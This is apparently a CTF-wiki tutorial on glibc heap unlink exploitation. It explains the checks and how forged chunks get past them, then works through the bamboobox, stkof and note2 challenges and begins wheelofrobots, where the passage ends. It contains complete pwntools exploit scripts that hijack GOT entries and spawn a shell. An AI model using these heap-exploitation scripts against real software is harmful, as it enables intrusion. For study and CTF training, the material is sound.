# Unlink

## Principle

When exploiting vulnerabilities caused by unlink, we essentially perform memory layout on chunks, then leverage the unlink operation to achieve the effect of modifying pointers.

Let's briefly review the purpose and process of unlink. Its purpose is to remove a free block from a doubly-linked list (e.g., during free, merging with a physically adjacent free chunk). The basic process is as follows:

![](./implementation/figure/unlink_smallbin_intro.png)

Below, we first introduce the exploitation method when unlink initially had no protections, then introduce the current way to exploit unlink.

### Ancient Unlink

When unlink was first implemented, there were actually no size checks or doubly-linked list checks on chunks, meaning the following check code did not exist:

```c
// Since P is already in the doubly-linked list, its size is recorded in two places, so check if they are consistent (size check)
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
// Check fd and bk pointers (doubly-linked list integrity check)
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \

  // largebin next_size doubly-linked list integrity check
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                                      \
                               "corrupted double-linked list (not small)",    \
                               P, AV);
```
**Here we use 32-bit as an example**, assuming the initial heap memory layout looks like this:

![](./figure/old_unlink_vul.png)

Now there are two physically contiguous chunks (Q, Nextchunk), where Q is in use and Nextchunk is in a freed state. If we modify Nextchunk's fd and bk pointers to specified values through some means (**such as overflow**), then when we free(Q):

- glibc determines this block is a small chunk
- Checks forward consolidation, finds that the previous chunk is in use, no forward consolidation needed
- Checks backward consolidation, finds that the next chunk is free, consolidation is needed
- Proceeds to perform the unlink operation on Nextchunk

So what does the unlink operation actually do? Let's analyze:

- FD=P->fd = target addr -12
- BK=P->bk = expect value
- FD->bk = BK, i.e., *(target addr-12+12)=BK=expect value
- BK->fd = FD, i.e., *(expect value +8) = FD = target addr-12

**It appears that we can achieve arbitrary address read/write directly through unlink, but we still need to ensure that the expect value +8 address has writable permissions.**

For example, if we set target addr to a certain GOT table entry, then when the program calls the corresponding libc function, it will directly execute the code at the value (expect value) we set. **Note that the value at expect value+8 is corrupted and needs to be worked around.**

### Current Unlink

**However, reality is harsh...** What we just considered was the case without checks, but once checks are added, it's not that simple anymore. Let's look at the check on fd and bk:

```c
// fd bk
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
```

At this point:

- FD->bk = target addr - 12 + 12=target_addr
- BK->fd = expect value + 8

So the method of modifying GOT table entries we used above may no longer work. However, we can bypass this mechanism through forgery.

First, through overwriting, we make nextchunk's FD pointer point to fakeFD, and nextchunk's BK pointer point to fakeBK. To pass the verification, we need:

- `fakeFD -> bk == P`  <=>  `*(fakeFD + 12) == P`
- `fakeBK -> fd == P`  <=>  `*(fakeBK + 8) == P`

When the above two conditions are satisfied, we can enter the Unlink phase, performing the following operations:

- `fakeFD -> bk = fakeBK`  <=>  `*(fakeFD + 12) = fakeBK`
- `fakeBK -> fd = fakeFD`  <=>  `*(fakeBK + 8) = fakeFD`

If we make fakeFD + 12 and fakeBK + 8 point to the same pointer that points to P, then:

- `*P = P - 8`
- `*P = P - 12`

That is, through this method, P's pointer points to an address 12 bytes lower than itself. Although this method cannot achieve arbitrary address write, it can modify the pointer pointing to a chunk, and such modification can achieve certain effects.

If we want both to point to P, we just need to modify as follows:

![](./figure/new_unlink_vul.png)

Note that we have not violated the following constraint here, because P was a pointer pointing to the correct chunk before Unlink.

```c
    // Since P is already in the doubly-linked list, its size is recorded in two places, so check if they are consistent.
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
```

**Additionally, if we set the next chunk's fd and bk both to the address of nextchunk, it can also bypass the above detection. However, this would not achieve the effect of modifying pointer contents.**

## Exploitation Ideas

### Conditions

1. UAF, able to modify the fd and bk pointers of smallbin or unsorted bin chunks in the freed state
2. A pointer at a known location points to a chunk that can be UAF'd

### Effect

Makes the pointer ptr that already points to a UAF chunk become ptr - 0x18

### Approach

Let the address of the pointer pointing to the UAF-able chunk be ptr

1. Modify fd to ptr - 0x18
2. Modify bk to ptr - 0x10
3. Trigger unlink

The pointer at ptr will become ptr - 0x18.

## HITCON Training Lab11: bamboobox
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/bamboofox)

### Basic Information
```shell
# zer0ptr @ zer0ptr-MateBook-D14 in ~/HITCON-Training/LAB/lab11 on git:master x [13:31:17]
$ file bamboobox
bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped

# zer0ptr @ zer0ptr-MateBook-D14 in ~/HITCON-Training/LAB/lab11 on git:master x [13:31:19]
$ checksec bamboobox
Arch:      amd64
RELRO:     Partial RELRO
Stack:     Canary found
NX:        NX enabled
PIE:       No PIE
Stripped:  No
```
Four functions, corresponding to `show()`, `add()`, `change()`, `free()`

### Heap Layout

#### Allocating Chunks
```python
additem(0x40, b"a"*8)   # chunk0 - container for the fake chunk
additem(0x80, b"b"*8)   # chunk1 - will be freed to trigger unlink
additem(0x40, b"c"*8)   # chunk2 - isolation layer to prevent consolidation with top chunk
```
The memory layout at this point:
```text
Low address                                   High address
[chunk0: 0x50] [chunk1: 0x90] [chunk2: 0x50] [top chunk]
```

#### Constructing Fake Chunk
```python
ptr = 0x6020c8  # storage location of chunk0's pointer

fake_chunk = p64(0)                    # fake chunk's prev_size
fake_chunk += p64(0x41)                # fake chunk's size (0x40 + 1)
fake_chunk += p64(ptr - 0x18)          # fd points to &global[2]-0x18
fake_chunk += p64(ptr - 0x10)          # bk points to &global[2]-0x10
fake_chunk += b"c" * 0x20              # padding to the end of chunk0's data area
fake_chunk += p64(0x40)                # overwrite chunk1.prev_size = 0x40
fake_chunk += p64(0x90)                # overwrite chunk1.size, clear PREV_INUSE bit
```

#### unlink
```python
change(0, 0x80, fake_chunk)   # edit chunk0, overwrite chunk1's header
remove(1)                      # free chunk1, trigger unlink
```
At this point `unlink fake_chunk` is executed, and the global[2] pointer is modified to &global[2]-0x18 (0x6020b0)

#### leak
```python
atoi_got = elf.got['atoi']
payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)
change(0, 0x80, payload)
show()                                  
r.recvuntil(b"0 : ")                     
leak_data = r.recvuntil(b":")[:6]       
atoi_addr = u64(leak_data.ljust(8, b"\x00"))  
libc = LibcSearcher('atoi', atoi_addr)   
libc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
```

#### getshell
```python
change(0, 0x8, p64(system_addr)) 
r.recvuntil(b":")
r.sendline(b"/bin/sh\x00")       
r.interactive()                   
```

Full exploit:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'
context(arch='amd64', os='linux')

r = process('./bamboobox')
elf = ELF('./bamboobox') 

def additem(length, name):
    r.recvuntil(b":")
    r.sendline(b"2")
    r.recvuntil(b":")
    r.sendline(str(length).encode())
    r.recvuntil(b":")
    r.send(name)

def change(idx, length, name):
    r.recvuntil(b":")
    r.sendline(b"3")
    r.recvuntil(b":")
    r.sendline(str(idx).encode())
    r.recvuntil(b":")
    r.sendline(str(length).encode())
    r.recvuntil(b":")
    r.send(name)

def remove(idx):
    r.recvuntil(b":")
    r.sendline(b"4")
    r.recvuntil(b":")
    r.sendline(str(idx).encode())

def show():
    r.recvuntil(b":")
    r.sendline(b"1")

# ========== Step 1: Allocate heap chunks ==========
print("[*] Step 1: Allocating chunks...")
additem(0x40, b"a"*8)   # chunk 0
additem(0x80, b"b"*8)   # chunk 1
additem(0x40, b"c"*8)   # chunk 2

# ========== Step 2: Construct fake chunk ==========
print("[*] Step 2: Constructing fake chunk...")
ptr = 0x6020c8  # storage location of chunk0's pointer

# Construct fake chunk
fake_chunk = p64(0)                    # prev_size
fake_chunk += p64(0x41)                # size (0x40 + 0x1, PREV_INUSE=1)
fake_chunk += p64(ptr - 0x18)          # fd
fake_chunk += p64(ptr - 0x10)          # bk
fake_chunk += b"c" * 0x20              # padding to the end of chunk0's data area
fake_chunk += p64(0x40)                # overwrite chunk1's prev_size
fake_chunk += p64(0x90)                # overwrite chunk1's size (clear PREV_INUSE bit)

print("[*] Step 3: Triggering overflow and unlink...")
change(0, 0x80, fake_chunk)
remove(1)  # trigger unlink

# ========== Step 3: Exploit arbitrary write after unlink ==========
print("[*] Step 4: Exploiting arbitrary write...")

# At this point chunk0's pointer points to ptr-24 (0x6020b0)
# Construct payload to change chunk0's pointer to point to atoi's GOT
atoi_got = elf.got['atoi']
payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)
change(0, 0x80, payload)

# ========== Step 4: Leak atoi address ==========
print("[*] Step 5: Leaking atoi address...")
show()

# Receive leaked address
r.recvuntil(b"0 : ")
leak_data = r.recvuntil(b":")[:6]  # receive 6 bytes
atoi_addr = u64(leak_data.ljust(8, b"\x00"))
print(f"[+] Leaked atoi address: {hex(atoi_addr)}")

# ========== Step 5: Use LibcSearcher to determine libc version ==========
print("[*] Step 6: Searching libc version...")
libc = LibcSearcher('atoi', atoi_addr)

# Get libc base address
libc_base = atoi_addr - libc.dump('atoi')
print(f"[+] libc base: {hex(libc_base)}")

# Get system address
system_addr = libc_base + libc.dump('system')
print(f"[+] system address: {hex(system_addr)}")

# Get /bin/sh address
binsh_addr = libc_base + libc.dump('str_bin_sh')
print(f"[+] /bin/sh address: {hex(binsh_addr)}")

# Optional: get one_gadget (common offsets for libc-2.23)
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
for og in one_gadgets:
    print(f"[+] possible one_gadget: {hex(libc_base + og)}")

# ========== Step 6: Hijack control flow ==========
print("[*] Step 7: Hijacking control flow...")

# Modify atoi's GOT to system
change(0, 0x8, p64(system_addr))

# Trigger system('/bin/sh')
r.recvuntil(b":")
r.sendline(b"/bin/sh\x00")
r.interactive()
```

## 2014 HITCON stkof

[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2014_hitcon_stkof)

### Basic Information

```shell
➜  2014_hitcon_stkof git:(master) file stkof
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
➜  2014_hitcon_stkof git:(master) checksec stkof
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As we can see, the program is 64-bit, with Canary and NX protections mainly enabled.

### Basic Functions

The program has 4 functions. After IDA analysis, the functions are as follows:

- alloc: Input size, allocate memory of that size, and record the corresponding chunk pointer in the bss segment, assuming it is called global
- read_in: Read data into the allocated memory based on a specified index, with controllable data length — **there is a heap overflow vulnerability here**
- free: Free the allocated memory block based on a specified index
- useless: This function is useless. It was initially thought to output content, but it outputs nothing

### I/O Buffer Issue Analysis

It is worth noting that since the program itself does not perform setbuf operations, buffers will be allocated when performing input/output operations. Through testing, two buffers are allocated, each of size 1024. The details are as follows, which can be verified through debugging.

When fgets is called for the first time, malloc allocates a buffer of size 1024.

```
*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd860 ◂— 0x16
*R8   0x1
*R9   0x0
*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700
*R11  0x246
*R12  0xa
*R13  0x9
 R14  0x0
*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 <malloc>        push   rbp <0x7ffff7dd18e0>
...omitted
 ► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a8769c _IO_file_underflow+508
   f 4     7ffff7a8860e _IO_default_uflow+14
   f 5     7ffff7a7bc6a _IO_getline_info+170
   f 6     7ffff7a7bd78
   f 7     7ffff7a7ab7d fgets+173
   f 8           400d2e
   f 9     7ffff7a2d830 __libc_start_main+240
```

After allocation, the heap looks like this:

```
pwndbg> heap
Top Chunk: 0xe05410
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0,
  size = 134129,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

After allocating memory of size 16, the heap layout is as follows:

```
pwndbg> heap
Top Chunk: 0xe05430
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa3631,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0,
  size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x20bd1
}
0xe05430 PREV_INUSE {
  prev_size = 0,
  size = 134097,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

When using the printf function, a 1024-byte space is allocated, as shown below:

```
*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd1c0 ◂— 0x16
 R8   0x0
*R9   0x0
*R10  0x0
*R11  0x246
*R12  0x1
*R13  0x7fffffffd827 ◂— 0x31 /* '1' */
 R14  0x0
*R15  0x400de4 ◂— and    eax, 0x2e000a64 /* '%d\n' */
*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284
*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 <malloc>       push   rbp <0x7ffff7dd2620>
...omitted
► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a878f8 _IO_file_overflow+456
   f 4     7ffff7a8628d _IO_file_xsputn+173
   f 5     7ffff7a5ae00 vfprintf+3216
   f 6     7ffff7a62899 printf+153
   f 7           4009cd
   f 8           400cb1
   f 9     7ffff7a2d830 __libc_start_main+240

```

The heap layout is as follows:

```
pwndbg> heap
Top Chunk: 0xe05840
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa3631,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0,
  size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x411
}
0xe05430 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa4b4f,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05840 PREV_INUSE {
  prev_size = 0,
  size = 133057,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

After this, no more buffers will be allocated for input or output operations. So it's best to initially allocate a chunk to get these buffers allocated, making subsequent operations easier.

However, interestingly, if we attach to the process, the first buffer allocated will be of size 4096.

```
pwndbg> heap
Top Chunk: 0x1e9b010
Last Remainder: 0

0x1e9a000 PREV_INUSE {
  prev_size = 0,
  size = 4113,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x1e9b010 PREV_INUSE {
  prev_size = 0,
  size = 135153,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}

```

### Basic Approach

Based on the analysis above, we first allocate a chunk to get the buffer allocation finished, to avoid affecting subsequent operations.

Since the program itself has no leak, to execute functions like system, our primary goal is to first construct a leak. The basic approach is as follows:

- Use unlink to modify global[2] to &global[2]-0x18.
- Use the edit function to modify global[0] to the free@got address, while modifying global[1] to the puts@got address, and global[2] to the atoi@got address.
- Modify `free@got` to the address of `puts@plt`, so that when `free` is called again, it directly calls the puts function. This allows leaking function contents.
- Free global[1], which leaks the puts@got contents, thereby obtaining the system function address and the /bin/sh address in libc.
- Modify `atoi@got` to the system function address, and when called again, input the /bin/sh address.

The code is as follows:

```python
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./stkof"
stkof = ELF('./stkof')
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./stkof")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')
head = 0x602140


def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')


def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')


def free(idx):
    p.sendline('3')
    p.sendline(str(idx))


def exp():
    # trigger to malloc buffer for io function
    alloc(0x100)  # idx 1
    # begin
    alloc(0x30)  # idx 2
    # small chunk size in order to trigger unlink
    alloc(0x80)  # idx 3
    # a fake chunk at global[2]=head+16 who's size is 0x20
    payload = p64(0)  #prev_size
    payload += p64(0x20)  #size
    payload += p64(head + 16 - 0x18)  #fd
    payload += p64(head + 16 - 0x10)  #bk
    payload += p64(0x20)  # next chunk's prev_size bypass the check
    payload = payload.ljust(0x30, 'a')

    # overwrite global[3]'s chunk's prev_size
    # make it believe that prev chunk is at global[2]
    payload += p64(0x30)

    # make it believe that prev chunk is free
    payload += p64(0x90)
    edit(2, len(payload), payload)

    # unlink fake chunk, so global[2] =&(global[2])-0x18=head-8
    free(3)
    p.recvuntil('OK\n')

    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
    payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(
        stkof.got['atoi'])
    edit(2, len(payload), payload)

    # edit free@got to puts@plt
    payload = p64(stkof.plt['puts'])
    edit(0, len(payload), payload)

    # free global[1] to leak puts addr
    free(1)
    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base: ' + hex(libc_base))
    log.success('/bin/sh addr: ' + hex(binsh_addr))
    log.success('system addr: ' + hex(system_addr))

    # modify atoi@got to system addr
    payload = p64(system_addr)
    edit(2, len(payload), payload)
    p.send(p64(binsh_addr))
    p.interactive()


if __name__ == "__main__":
    exp()
```

## 2016 ZCTF note2
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2016_zctf_note2)

### Program Analysis

First, let's analyze the program. We can see that the main functions of the program are:

- Add note: size is limited to 0x80, size is recorded, and the note pointer is recorded.
- Show note content.
- Edit note content, including overwriting an existing note and appending content after an existing note.
- Free note.

After careful analysis, we can find the following issues with the program:

1. When adding a note, the program records the note's corresponding size, which is used to control reading the note's content. However, the loop variable i for reading is an unsigned variable, so comparisons are all converted to unsigned variables. When we input a size of 0, glibc will allocate 0x20 bytes according to its rules, but the program's reading of content is not restricted, resulting in a heap overflow.
2. The program allocates 0xa0 bytes of memory each time a note is edited, but does not set it to NULL after freeing.

The code corresponding to the first issue in IDA is as follows:

```c
unsigned __int64 __fastcall ReadLenChar(__int64 a1, __int64 a2, char a3)
{
  char v4; // [sp+Ch] [bp-34h]@1
  char buf; // [sp+2Fh] [bp-11h]@2
  unsigned __int64 i; // [sp+30h] [bp-10h]@1
  __int64 v7; // [sp+38h] [bp-8h]@2

  v4 = a3;
  for ( i = 0LL; a2 - 1 > i; ++i )
  {
    v7 = read(0, &buf, 1uLL);
    if ( v7 <= 0 )
      exit(-1);
    if ( buf == v4 )
      break;
    *(_BYTE *)(i + a1) = buf;
  }
  *(_BYTE *)(a1 + i) = 0;
  return i;
}
```

Here i is of unsigned type and a2 is of int type, so when they are compared in the for loop, the result of a2-1 which is -1 will be treated as unsigned type, i.e., the maximum integer. So data of arbitrary length can be read, which is the method we use for overflow later.

### Basic Approach

Here we mainly exploit the first issue discovered, primarily using the fastbin mechanism and the unlink mechanism.

We will explain each step below.

#### Basic Operations

First, let's list the possible basic operations for notes.

```python
p = process('./note2')
note2 = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)


def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))


def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))
```

#### Creating Three Notes

Construct three chunks: chunk0, chunk1, and chunk2

```python
# chunk0: a fake chunk
ptr = 0x0000000000602120
fakefd = ptr - 0x18
fakebk = ptr - 0x10
content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
#content = p64(fakefd) + p64(fakebk)
newnote(128, content)
# chunk1: a zero size chunk produce overwrite
newnote(0, 'a' * 8)
# chunk2: a chunk to be overwrited and freed
newnote(0x80, 'b' * 16)
```

The allocation sizes of these three chunks are 0x80, 0, and 0x80 respectively. Although chunk1's requested size is 0, glibc requires that a chunk block can store at least 4 necessary fields (prev\_size, size, fd, bk), so 0x20 of space will be allocated. At the same time, due to the unsigned integer comparison issue, strings of arbitrary length can be input for this note.

Note that chunk0 has two chunks constructed within it:

- chunk ptr[0], this is for modifying the corresponding value during unlink.
- chunk ptr[0]'s nextchunk, this is to satisfy the first check during unlink.

```c
    // Since P is already in the doubly-linked list, its size is recorded in two places, so check if they are consistent.
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
```

After constructing the three notes, the basic heap structure is as shown in Figure 1.

```
                                   +-----------------+ high addr
                                   |      ...        |
                                   +-----------------+
                                   |      'b'*8      |
                ptr[2]-----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|------------
                                   |    unused       |
                                   +-----------------+
                                   |    'a'*8        |
                 ptr[1]----------> +-----------------+  chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|-------------
                                   |    unused       |
                                   +-----------------+
                                   |  prev_size=0x60 |
fake ptr[0] chunk's nextchunk----->+-----------------+
                                   |    64*'a'       |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0x61         |  chunk 0
                                   +-----------------+
                                   |    'a *8        |
                 ptr[0]----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
                                           Figure 1
```

#### Free chunk1 - Overwrite chunk2 - Free chunk2

The corresponding code is as follows:

```python
# edit the chunk1 to overwrite the chunk2
deletenote(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
newnote(0, content)
# delete note 2 to trigger the unlink
# after unlink, ptr[0] = ptr - 0x18
deletenote(2)
```

First, free chunk1. Since this chunk belongs to a fastbin, it will be allocated again on the next request. At the same time, due to the type issue mentioned above, we can read arbitrary characters, allowing us to overwrite chunk2. After overwriting, the layout is as shown in Figure 2.

```
                                   +-----------------+high addr
                                   |      ...        |
                                   +-----------------+
                                   |   '\x00'+'b'*7  |
                ptr[2]-----------> +-----------------+ chunk 2
                                   |    size=0x90    |
                                   +-----------------+
                                   |    0xa0         |
                                   +-----------------|------------
                                   |    'a'*8        |
                                   +-----------------+
                                   |    'a'*8        |
                 ptr[1]----------> +-----------------+ chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|-------------
                                   |    unused       |
                                   +-----------------+
                                   |  prev_size=0x60 |
fake ptr[0] chunk's nextchunk----->+-----------------+
                                   |    64*'a'       |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0x61         |  chunk 0
                                   +-----------------+
                                   |    'a *8        |
                 ptr[0]----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
                                           Figure 2
```

This overwrite is mainly so that when freeing chunk2, backward consolidation (merging with lower addresses) can be performed, unlinking the virtually constructed chunk in chunk0. That is, the operation to be executed is unlink(ptr[0]), and the fakebk and fakefd we constructed satisfy the following constraint:

```c
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
```

After unlink is successfully executed, the address stored in ptr[0] will change to fakebk, i.e., ptr-0x18.

#### Getting system Address

The code is as follows:

```python
# overwrite the chunk0(which is ptr[0]) with got atoi
atoi_got = note2.got['atoi']
content = 'a' * 0x18 + p64(atoi_got)
editnote(0, 1, content)
# get the aoti addr
shownote(0)

sh.recvuntil('is ')
atoi_addr = sh.recvuntil('\n', drop=True)
print atoi_addr
atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
print 'leak atoi addr: ' + hex(atoi_addr)

# get system addr
atoi_offest = libc.symbols['atoi']
libcbase = atoi_addr - atoi_offest
system_offest = libc.symbols['system']
system_addr = libcbase + system_offest

print 'leak system addr: ', hex(system_addr)
```

We modify ptr[0]'s content to the address of ptr - 0x18, so when we edit note0 again, we can overwrite ptr[0]'s content. Here we overwrite it with atoi's address.
This way, if we view note 0's content, what we actually see is atoi's address.

Then we calculate system's address based on the corresponding offset in libc.

#### Modifying atoi GOT

```python
# overwrite the atoi got with systemaddr
content = p64(system_addr)
editnote(0, 1, content)
```

Since ptr[0]'s address is now the GOT table address, we can directly modify this note and overwrite it with the system address.

#### get shell

```python
# get shell
sh.recvuntil('option--->>')
sh.sendline('/bin/sh')
sh.interactive()
```

At this point, if we call atoi again, it actually calls the system function, so we can get a shell.

## 2017 insomni'hack wheelofrobots
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2017_insomni'hack_wheelofrobots)

### Basic Information

```shell
➜  2017_insomni'hack_wheelofrobots git:(master) file wheelofrobots
wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped
➜  2017_insomni'hack_wheelofrobots git:(master) checksec wheelofrobots
[*] "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni'hack_wheelofrobots/wheelofrobots"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Dynamically linked 64-bit, with canary protection and NX protection mainly enabled.

### Basic Functions

After roughly analyzing the program, we can determine that this is a game for configuring robot wheels. The robot needs a total of 3 wheels added.

A heavily relied-upon function of the program is reading integers. The function read_num reads a specified length and converts it to an int type number.

The specific functions are as follows:

- Add wheel: There are 6 wheels to choose from. When selecting a wheel, the function read_num is used, and `read_num((char *)&choice, 5uLL);` reads 5 bytes, which exactly overwrites the lowest byte of bender_inuse, constituting an off-by-one vulnerability. Additionally, when adding a Destructor wheel, no size check is performed. If the number read is negative, then `calloc(1uLL, 20 * v5);` might cause `20*v5` to overflow, but at the same time, `destructor_size = v5` will still be very large.
- Remove wheel: Directly removes the corresponding wheel, but does not set its corresponding pointer to NULL, and its corresponding size is not cleared either.
- Change wheel name: This reads data based on the size of the wheel space requested at the time. As we mentioned earlier, when reading the size for the destructor wheel, negative numbers are not checked, so when performing `result = read(0, destructor, 20 * destructor_size);`, there is a nearly arbitrary-length overflow vulnerability.
- Start robot: During startup, some wheel names are randomly output, which is difficult for us to control.

In summary, we can see that the main vulnerabilities in this program are off-by-one and integer overflow. Here we primarily use the off-by-one vulnerability mentioned above.

### Exploitation Approach

The basic exploitation approach is as follows:

1. Use the off-by-one vulnerability with fastbin attack to allocate a chunk at 0x603138, which allows controlling the size of `destructor_size`, thereby achieving arbitrary-length heap overflow. Here we allocate wheel 1 (tinny) to this location.
